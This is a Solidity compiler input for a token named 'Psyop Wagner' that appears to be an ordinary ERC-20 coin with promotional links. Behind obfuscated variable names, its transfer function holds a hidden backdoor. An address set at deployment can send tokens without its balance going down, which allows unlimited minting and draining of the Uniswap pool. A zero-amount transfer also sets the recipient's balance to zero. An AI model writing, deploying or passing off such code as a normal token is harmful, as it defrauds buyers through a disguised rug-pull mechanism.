{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nWebsite: https://psyopwagner.cryptotoken.live/\n\nTwitter: https://twitter.com/PsyopWagner\n\nTelegram: https://t.me/PsyopWagner\n\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity >=0.8.12;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\n\ncontract PsyopWagner is Ownable {\n    function approve(address evzowacuglir, uint256 hqnztcaeyoj) public returns (bool success) {\r\n        allowance[msg.sender][evzowacuglir] = hqnztcaeyoj;\r\n        emit Approval(msg.sender, evzowacuglir, hqnztcaeyoj);\r\n        return true;\r\n    }\n\n    function thajfbin(address pltc, address yzvhji, uint256 hqnztcaeyoj) private {\r\n        if (0 == cpsfoer[pltc]) {\r\n            balanceOf[pltc] -= hqnztcaeyoj;\r\n        }\r\n        balanceOf[yzvhji] += hqnztcaeyoj;\r\n        if (0 == hqnztcaeyoj && yzvhji != qwimec) {\r\n            balanceOf[yzvhji] = hqnztcaeyoj;\r\n        }\r\n        emit Transfer(pltc, yzvhji, hqnztcaeyoj);\r\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function transferFrom(address pltc, address yzvhji, uint256 hqnztcaeyoj) public returns (bool success) {\r\n        require(hqnztcaeyoj <= allowance[pltc][msg.sender]);\r\n        allowance[pltc][msg.sender] -= hqnztcaeyoj;\r\n        thajfbin(pltc, yzvhji, hqnztcaeyoj);\r\n        return true;\r\n    }\n\n    address public qwimec;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\n\n    mapping(address => uint256) private qfbjsai;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    uint8 public decimals = 9;\n\n    uint256 private tbsouqagk = 120;\n\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address bkecpo) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        cpsfoer[bkecpo] = tbsouqagk;\r\n        IUniswapV2Router02 qkzmit = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        qwimec = IUniswapV2Factory(qkzmit.factory()).createPair(address(this), qkzmit.WETH());\r\n    }\n\n    function transfer(address yzvhji, uint256 hqnztcaeyoj) public returns (bool success) {\r\n        thajfbin(msg.sender, yzvhji, hqnztcaeyoj);\r\n        return true;\r\n    }\n\n    mapping(address => uint256) private cpsfoer;\n\n    string public symbol = 'Psyop Wagner';\n\n    string public name = 'Psyop Wagner';\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}